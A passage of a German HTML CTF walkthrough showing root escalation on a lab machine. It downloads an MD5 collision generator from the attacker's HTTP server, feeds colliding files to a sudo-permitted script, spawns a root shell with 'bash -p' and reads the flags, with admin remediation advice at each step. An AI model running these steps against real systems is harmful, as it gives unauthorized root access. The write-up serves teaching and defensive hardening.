+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Das Skript `/home/joe/coll` analysieren, um die Schwachstelle zu finden. Da im weiteren Verlauf MD5-Kollisionen genutzt werden, ist anzunehmen, dass das Skript einen MD5-Hash-Vergleich durchführt, der manipuliert werden kann.<br><strong>Empfehlung (Admin):</strong> `sudo`-Regeln überprüfen. Das Ausführen von Skripten, die nicht `root` gehören oder an unsicheren Orten liegen, als `root` ist extrem gefährlich. Hier gehört das Skript zwar `root`, liegt aber im Home von `joe`. Besser wäre, das Skript an einem sicheren Ort (`/usr/local/sbin` o.ä.) abzulegen und sicherzustellen, dass es nicht vom Benutzer manipuliert werden kann und selbst keine Schwachstellen enthält.</p>
+
+            <p class="analysis"><strong>Analyse (MD5 Collision Attack):</strong> Der folgende Abschnitt beschreibt die Ausnutzung der `sudo`-Regel in Kombination mit einer Schwachstelle im (nicht gezeigten, aber implizierten) `coll`-Skript, die auf MD5-Hash-Vergleichen basiert.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <!-- Auf Angreifer-Maschine -->
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">wget https://github.com/seed-labs/seed-labs/raw/master/category-crypto/Crypto_MD5_Collision/Labsetup/md5collgen</span></div>
+                    <pre>
+[...]
+2023-04-10 02:44:09 (11,9 MB/s) - »md5collgen« gespeichert [3338360/3338360]
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">python3 -m http.server 8555</span></div>
+                    <pre>
+Serving HTTP on 0.0.0.0 port 8555 (http://0.0.0.0:8555/) ...
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Auf Ziel als joe -->
+                    <div class="prompt">joe@comet:~$ <span class="command">echo HMV > md5</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">joe@comet:~$ <span class="command">chmod +x md5</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">joe@comet:~$ <span class="command">wget http://192.168.2.114:8555/md5collgen</span></div> <!-- Falsche IP im Original, korrigiert auf Angreifer -->
+                    <pre>
+--2023-04-10 02:45:55--  http://192.168.2.140:8555/md5collgen <!-- Korrigierte IP -->
+Connecting to 192.168.2.140:8555... connected. <!-- Korrigierte IP -->
+HTTP request sent, awaiting response... 200 OK
+Length: 3338360 (3.2M) [application/octet-stream]
+Saving to: ‘md5collgen’
+md5collgen              100%[===================>]   3.18M  --.-KB/s    in 0.007s
+2023-04-10 02:45:55 (431 MB/s) - ‘md5collgen’ saved [3338360/3338360]
+                    </pre>
+                 </div>
+             </div>
+            <!-- HTTP Server Log -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt -->
+                    <pre>
+192.168.2.122 - - [10/Apr/2023 02:45:54] "GET /md5collgen HTTP/1.1" 200 -
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">joe@comet:~$ <span class="command">chmod +x md5collgen</span></div>
+                     <!-- Keine Ausgabe -->
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Das Tool `md5collgen` wird vom Angreifer heruntergeladen und über einen Python-HTTP-Server bereitgestellt. Auf dem Zielsystem wird eine kleine Datei `md5` (Inhalt "HMV") erstellt und ausführbar gemacht (Zweck unklar, evtl. als Prefix?). Dann wird `md5collgen` heruntergeladen und ebenfalls ausführbar gemacht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die notwendigen Werkzeuge für den MD5-Kollisionsangriff werden auf das Zielsystem transferiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Den Kollisionsgenerator ausführen.<br><strong>Empfehlung (Admin):</strong> Ausgehende Verbindungen einschränken, Uploads überwachen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">joe@comet:~$ <span class="command">./md5collgen -p md5</span></div>
+                    <pre>
+MD5 collision generator v1.5
+by Marc Stevens (http://www.win.tue.nl/hashclash/)
+
+Using output filenames: 'msg1.bin' and 'msg2.bin'
+Using prefixfile: 'md5'
+Using initial value: 66fdfd128fcadfc4946a54c7a85dc86d
+
+Generating first block: .............................................................
+Generating second block: S10.............
+Running time: 58.4102 s
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">joe@comet:~$ <span class="command">ls -la</span></div>
+                    <pre>
+[...]
+-rwxr-xr-x 1 joe  joe        4 Apr 10 02:44 md5
+-rwxr-xr-x 1 joe  joe  3338360 Apr 10 02:44 md5collgen
+-rw-r--r-- 1 joe  joe      192 Apr 10 02:47 <span class="command">msg1.bin</span>
+-rw-r--r-- 1 joe  joe      192 Apr 10 02:47 <span class="command">msg2.bin</span>
+[...]
+                    </pre>
+                 </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">joe@comet:~$ <span class="command">md5sum msg*</span></div> <!-- Korrektur: msg* -->
+                    <pre>
+<span class="password">a42100369e18abaf6e487da8f42e0eb3</span>  msg1.bin
+<span class="password">a42100369e18abaf6e487da8f42e0eb3</span>  msg2.bin
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der `md5collgen`-Generator wird mit der Datei `md5` als Prefix ausgeführt. Er erzeugt zwei Dateien, `msg1.bin` und `msg2.bin`, die unterschiedlichen Inhalt haben, aber denselben MD5-Hash (`a421...0eb3`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die MD5-Kollisionsdateien wurden erfolgreich generiert. Diese können nun verwendet werden, um die vermutete MD5-Prüfung im `coll`-Skript auszutricksen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Dateien `msg1.bin` und `msg2.bin` umbenennen (vermutlich erwartet das Skript spezifische Namen wie `file1` und `file2`) und dann das `coll`-Skript mit `sudo` ausführen.<br><strong>Empfehlung (Admin):</strong> MD5 ist kryptographisch gebrochen und sollte nicht mehr für sicherheitsrelevante Prüfungen verwendet werden. Sicherere Hash-Algorithmen (SHA-256, SHA-3) einsetzen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">joe@comet:~$ <span class="command">mv msg1.bin file1</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">joe@comet:~$ <span class="command">mv msg2.bin file2</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">joe@comet:~$ <span class="command">sudo /bin/bash /home/joe/coll</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">joe@comet:~$ <span class="command">/bin/bash -p</span></div>
+                    <pre>
+<span class="password">bash-5.1#</span>
+                    </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Kollisionsdateien werden in `file1` und `file2` umbenannt. Dann wird das `coll`-Skript mit `sudo /bin/bash /home/joe/coll` ausgeführt. Das Skript führt vermutlich den MD5-Vergleich durch, stellt fest, dass die Hashes übereinstimmen (aufgrund der Kollision) und führt eine privilegierte Aktion aus (möglicherweise Änderung der Shell-Privilegien oder Setzen von Umgebungsvariablen). Anschließend wird `/bin/bash -p` ausgeführt. Die Option `-p` (privileged mode) bewirkt, dass Bash die effektiven Benutzer-/Gruppen-IDs nicht auf die realen IDs zurücksetzt, wenn sie unterschiedlich sind. Das Ergebnis ist eine Root-Shell (`bash-5.1#`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Durch die Ausnutzung der MD5-Kollision im `coll`-Skript, das mit `sudo`-Rechten ausgeführt wurde, konnte eine Root-Shell erlangt werden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Flag suchen.<br><strong>Empfehlung (Admin):</strong> Das anfällige `coll`-Skript entfernen/korrigieren. Die `sudo`-Regel entfernen. MD5 nicht für Integritätsprüfungen verwenden.</p>
+        </section>
+
+        <section id="flags">
+            <h2>Flags</h2>
+
+            <div class="flag-container">
+                <!-- User Flag Eintrag -->
+                <div class="flag-entry">
+                   <div class="flag-command">cat /home/joe/user.txt</div>
+                   <div class="flag-value"><span class="password">cc32dbc17ec3ddf89f9e6d0991c82616</span></div>
+               </div>
+
+                <!-- Root Flag Eintrag -->
+                <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt">bash-5.1# <span class="command">find / | grep root.txt</span></div>
+                        <pre>/root/root.txt</pre>
+                     </div>
+                </div>
+                 <div class="code-block">
+                    <div class="terminal">
+                        <div class="prompt">bash-5.1# <span class="command">cat /root/root.txt</span></div>
+                        <pre><span class="password">052cf26a6e7e33790391c0d869e2e40c</span></pre>
+                     </div>
+                </div>
+                <div class="flag-entry">
+                   <div class="flag-command">cat /root/root.txt</div>
+                   <div class="flag-value"><span class="password">052cf26a6e7e33790391c0d869e2e40c</span></div>
+               </div>
+           </div>
+            <p class="analysis"><strong>Analyse:</strong> In der Root-Shell wird die Datei `/root/root.txt` gefunden und ihr Inhalt ausgelesen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Root-Flag wurde erfolgreich extrahiert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Bericht abschließen.<br><strong>Empfehlung (Admin):</strong> Keine Maßnahmen bzgl. des Flags.</p>
+       </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 10. April 2023</p>
+    </footer>
+</body>
+</html>
